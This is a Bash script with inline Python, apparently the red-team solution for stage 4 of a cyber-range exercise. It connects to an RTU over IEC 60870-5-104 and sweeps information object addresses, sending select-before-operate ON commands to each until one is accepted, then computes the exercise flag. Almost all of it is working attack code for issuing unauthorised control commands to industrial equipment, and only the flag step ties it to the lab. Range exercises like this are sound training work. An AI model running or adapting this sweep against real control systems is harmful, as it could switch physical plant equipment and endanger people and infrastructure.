#!/usr/bin/env bash
###############################################################################
# red_attack_script.sh — Stage 4 Red Team Attack Script
#
# Inline Python client using c104 that connects, performs SBO, and solves
# the challenge.
###############################################################################
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHARED_DIR="$(cd "${SCRIPT_DIR}/../shared" && pwd)"
RANGE_ENV="${SHARED_DIR}/range.env"

# Load environment if readable, otherwise check for existing environment variables
if [[ -r "${RANGE_ENV}" ]]; then
    source "${RANGE_ENV}"
else
    if [[ -z "${RTU_IP:-}" || -z "${TARGET_IOA:-}" || -z "${IOA_END:-}" || -z "${INSTANCE_SEED:-}" ]]; then
        echo "[-] Error: range.env not readable and required environment variables not set." >&2
        exit 1
    fi
fi

export RTU_IP TARGET_IOA IOA_END INSTANCE_SEED

python3 - << 'EOF'
import c104
import os
import sys
import time
import hmac
import hashlib

def load_range_env():
    required_vars = ["TARGET_IOA", "IOA_END", "RTU_IP", "INSTANCE_SEED"]
    if all(var in os.environ for var in required_vars):
        return os.environ
    print("[-] Error: Environment variables TARGET_IOA, IOA_END, RTU_IP, INSTANCE_SEED are not set.")
    sys.exit(1)

def compute_flag(seed: str, ioa: int, type_str: str) -> str:
    artifact = f"IOA:{ioa}:TYPE:{type_str}:ACK"
    flag_msg = f"STAGE4:{artifact}"
    h = hmac.new(bytes.fromhex(seed), flag_msg.encode(), hashlib.sha256)
    flag_hex = h.hexdigest()[:16]
    return f"FLAG{{S4-{flag_hex}}}"

def main():
    env = load_range_env()
    rtu_ip = env.get("RTU_IP", "10.100.1.3")
    target_ioa = int(env.get("TARGET_IOA", "2947"))
    ioa_end = int(env.get("IOA_END", "3146"))
    seed = env.get("INSTANCE_SEED")
    
    print(f"[*] Target RTU: {rtu_ip}:2404")
    print(f"[*] Sweeping IOA range: {target_ioa} to {ioa_end}")
    
    for ioa in range(target_ioa, ioa_end + 1):
        expected_type = c104.Type.C_SC_NA_1 if ioa % 2 != 0 else c104.Type.C_DC_NA_1
        type_str = "C_SC_NA_1" if ioa % 2 != 0 else "C_DC_NA_1"
        
        print(f"[*] Testing IOA {ioa} ({type_str})... ", end="", flush=True)
        
        client = c104.Client()
        conn = client.add_connection(ip=rtu_ip, port=2404)
        if not conn:
            print("Failed to add connection.")
            continue
            
        station = conn.add_station(common_address=1)
        p = station.add_point(io_address=ioa, type=expected_type, command_mode=c104.CommandMode.SELECT_AND_EXECUTE)
        
        client.start()
        
        connected = False
        for _ in range(5):
            if conn.is_connected:
                connected = True
                break
            time.sleep(0.1)
            
        if not connected:
            print("Offline/Silent.")
            client.stop()
            continue
            
        # Session start
        conn.unmute()
        time.sleep(0.1)
        
        # Prepare command value
        if expected_type == c104.Type.C_SC_NA_1:
            p.value = True
        else:
            p.value = c104.Double.ON
            
        # Transmit (SBO)
        success = p.transmit(cause=c104.Cot.ACTIVATION)
        
        client.stop()
        
        if success:
            print("SUCCESS!")
            flag = compute_flag(seed, ioa, type_str)
            print(f"[+] Flag found: {flag}")
            sys.exit(0)
        else:
            print("Failed.")
            
    print("[-] Sweep finished, no success.")
    sys.exit(1)

if __name__ == "__main__":
    main()
EOF
